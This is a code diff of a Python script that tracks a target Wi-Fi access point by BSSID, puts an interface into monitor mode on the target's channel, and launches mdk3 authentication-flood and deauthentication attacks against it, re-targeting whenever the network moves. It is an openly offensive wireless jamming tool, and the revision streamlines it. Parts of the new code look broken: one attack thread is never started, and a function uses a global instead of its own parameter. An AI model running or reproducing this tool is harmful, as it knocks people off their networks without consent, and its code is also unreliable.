@@ -3,7 +3,7 @@ import re
 import subprocess
 import threading
 from time import sleep
-from typing import Any
+from typing import Any, Literal
 
 import click
 from rich.console import Console
@@ -18,6 +18,78 @@ install()
 
 
 devnull = open(os.devnull, "wt")
+
+
+def change_interface_status(interface: str, status: Literal["up", "down"]):
+    logger.info(f"Make the interface {interface!r} {status}.")
+    p = subprocess.run(
+        ["sudo", "ip", "link", "set", interface, f"{status}"],
+        stderr=devnull,
+        stdout=devnull,
+    )
+
+    return p.returncode
+
+
+def change_interface_type(interface: str, _type: Literal["managed", "monitor"]):
+    change_interface_status(_interface, "down")
+    logger.info(f"Change the {interface} type to {_type}.")
+    p = subprocess.run(
+        ["sudo", "iw", "dev", interface, "set", "type", f"{_type}"],
+        stderr=devnull,
+        stdout=devnull,
+    )
+    change_interface_status(_interface, "up")
+
+    return p.returncode
+
+
+def change_interface_channel(interface: str, channel: int):
+    change_interface_status(interface, "up")
+    logger.info(f"Change the channel to <cyan>{channel!r}</cyan>.")
+    p = subprocess.run(
+        [
+            "sudo",
+            "iw",
+            "dev",
+            f"{interface}",
+            "set",
+            "channel",
+            f"{channel}",
+        ],
+    )
+
+    return p.returncode
+
+
+def play(
+    duration: int = 10,
+    channel: int = 10,
+    file_type: str = "raw",
+    rate: int = 2200,
+    format: str = "u8",
+    file: str = "/dev/random",
+):
+    threading.Thread(
+        target=subprocess.run,
+        args=(
+            [
+                "aplay",
+                "--duration",
+                f"{duration}",
+                "--channels",
+                f"{channel}",
+                "--file-type",
+                f"{file_type}",
+                "--rate",
+                f"{rate}",
+                "--format",
+                f"{format}",
+                f"{file}",
+            ],
+        ),
+        kwargs={"stdout": devnull, "stderr": devnull},
+    ).start()
 
 
 class Target:
@@ -36,29 +108,8 @@ class Target:
 
     def __setattr__(self, name: str, value: Any, /) -> None:
         if hasattr(self, name):
-            if (
-                name == "ssid"
-                and self.ssid is not None
-                and self.ssid != value
-                and _play_sound_when_ssid_changed
-            ):
-                threading.Thread(
-                    target=subprocess.run,
-                    args=(
-                        [
-                            "aplay",
-                            "--duration",
-                            "30",
-                            "--channels=11",
-                            "--file-type",
-                            "raw",
-                            "--rate=2220",
-                            "--format=u8",
-                            "/dev/random",
-                        ],
-                    ),
-                    kwargs={"stdout": devnull, "stderr": devnull},
-                ).start()
+            if name == "ssid" and self.ssid is not None and self.ssid != value:
+                play()
 
             super().__setattr__(name, value)
 
@@ -67,57 +118,32 @@ class Target:
                     rf"The target was found <b>{self.bssid!r} ({self.ssid})</b> on <b>{self.channel!r}</b> channel!"
                 )
 
-                logger.info(f"Set up the {_interface_monitored} link.")
-                subprocess.run(
-                    ["sudo", "ip", "link", "set", _interface_monitored, "up"],
-                    stderr=devnull,
-                    stdout=devnull,
-                )
+                change_interface_type(_interface, "monitor")
+                change_interface_channel(_interface, self.channel)
 
-                logger.info(f"Change the channel to <cyan>{self.channel!r}</cyan>.")
+                logger.info("Starting the <b>mdk3</b> sub processe(s)...")
                 threading.Thread(
                     target=subprocess.run,
                     args=(
                         [
                             "sudo",
-                            "iw",
-                            "dev",
-                            f"{_interface_monitored}",
-                            "set",
-                            "channel",
-                            f"{self.channel}",
+                            "mdk3",
+                            _interface,
+                            "a",
+                            "-a",
+                            self.bssid,
+                            "-c",
+                            "-m",
                         ],
                     ),
                     kwargs={"stdout": devnull, "stderr": devnull},
+                )
+
+                threading.Thread(
+                    target=subprocess.run,
+                    args=(["sudo", "mdk3", _interface, "d"],),
+                    kwargs={"stdout": devnull, "stderr": devnull},
                 ).start()
-
-                if _mdk3_a_mode or _mdk3_d_mode:
-                    logger.info("Starting the <b>mdk3</b> sub processe(s)...")
-
-                if _mdk3_a_mode:
-                    threading.Thread(
-                        target=subprocess.run,
-                        args=(
-                            [
-                                "sudo",
-                                "mdk3",
-                                _interface_monitored,
-                                "a",
-                                "-a",
-                                self.bssid,
-                                "-c",
-                                "-m",
-                            ],
-                        ),
-                        kwargs={"stdout": devnull, "stderr": devnull},
-                    ).start()
-
-                if _mdk3_d_mode:
-                    threading.Thread(
-                        target=subprocess.run,
-                        args=(["sudo", "mdk3", _interface_monitored, "d"],),
-                        kwargs={"stdout": devnull, "stderr": devnull},
-                    ).start()
 
         return super().__setattr__(name, value)
 
@@ -130,35 +156,15 @@ def refresh():
         logger.info("Killing previous processes...")
 
         os.system("sudo pkill -9 mdk3 > /dev/null 2>&1; ")
-        os.system("sudo pkill -9 airodump-ng > /dev/null 2>&1; ")
 
-        logger.info(f"Set down the {_interface_monitored} link.")
-        subprocess.run(
-            ["sudo", "ip", "link", "set", _interface_monitored, "down"],
-            stderr=devnull,
-            stdout=devnull,
-        )
-
-        logger.info(f"Set up the {_interface_managed} link.")
-        subprocess.run(
-            ["sudo", "ip", "link", "set", _interface_managed, "up"],
-            stderr=devnull,
-            stdout=devnull,
-        )
+        change_interface_type(_interface, "managed")
 
         logger.info(f"Scanning...")
         process = subprocess.run(
-            ["sudo", "iw", "dev", _interface_managed, "scan"],
+            ["sudo", "iw", "dev", _interface, "scan"],
             capture_output=True,
             text=True,
             check=False,
-        )
-
-        logger.info(f"Set down the {_interface_managed} link.")
-        subprocess.run(
-            ["sudo", "ip", "link", "set", _interface_managed, "down"],
-            stderr=devnull,
-            stdout=devnull,
         )
 
         logger.info(f"Extracting the BSSID and Channel...")
@@ -217,38 +223,17 @@ def refresh():
 @click.command()
 @click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
 @click.option("--interval", type=int, default=60)
-@click.option("--mdk3-a-mode", is_flag=True, default=False)
-@click.option("--mdk3-d-mode", is_flag=True, default=True)
-@click.option("--play-sound-when-ssid-changed", is_flag=True, default=False)
-@click.argument("interface_managed")
-@click.argument("interface_monitored")
-def main(
-    bssid: str,
-    interval,
-    mdk3_a_mode,
-    mdk3_d_mode,
-    play_sound_when_ssid_changed,
-    interface_managed,
-    interface_monitored,
-) -> None:
+@click.argument("interface")
+def main(bssid: str, interval: int, interface: str) -> None:
     logger.debug(rf"BSSID: <b>{bssid!r}</b>")
-    logger.debug(rf"Interval: <b>{interval!r}</b>")
-    logger.debug(rf"Managed Interface: <b>{interface_managed!r}</b>")
-    logger.debug(rf"Monitored Interface: <b>{interface_monitored!r}</b>")
+    logger.debug(rf"Interval: <b>{interval!r}</b> seconds")
+    logger.debug(rf"Interface: <b>{interface!r}</b>")
 
-    global _interface_managed
-    global _interface_monitored
-    global _mdk3_a_mode
-    global _mdk3_d_mode
+    global _interface
     global _interval
-    global _play_sound_when_ssid_changed
 
-    _interface_managed = interface_managed
-    _interface_monitored = interface_monitored
-    _mdk3_a_mode = mdk3_a_mode
-    _mdk3_d_mode = mdk3_d_mode
     _interval = interval
-    _play_sound_when_ssid_changed = play_sound_when_ssid_changed
+    _interface = interface
 
     threading.Thread(target=refresh).start()
 
